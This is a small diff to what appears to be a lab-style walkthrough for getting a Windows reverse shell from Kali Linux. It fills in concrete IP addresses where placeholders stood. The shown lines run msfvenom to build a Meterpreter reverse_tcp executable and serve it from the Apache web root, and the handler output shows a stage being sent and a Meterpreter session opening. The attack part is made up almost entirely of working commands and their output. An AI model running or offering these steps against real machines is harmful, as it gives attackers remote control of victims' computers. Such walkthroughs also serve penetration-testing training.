@@ -6,7 +6,7 @@
 
 # run the following to create msfvenom reverse shell payload *.exe and place it into your webserver directory #
 ┌──(root💀kali )-[/g]
-└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kaliip> -f exe > /var/www/html/fun.exe  
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > /var/www/html/fun.exe  
 
 
 # the wares have been created run the following to start the appache webserver #
@@ -40,7 +40,7 @@ LHOST => 0.0.0.0
 
 [*] Started reverse TCP handler on 0.0.0.0:4444 
 [*] Sending stage (175174 bytes) to <windowsip>
-[*] Meterpreter session 1 opened (<kaliip>:4444 -> <windowsip>:2352 ) at 2022-02-28 00:55:06 -0500
+[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.3:2352 ) at 2022-02-28 00:55:06 -0500
 
 # you have now spawned reverse shell with meterpreter # 
 
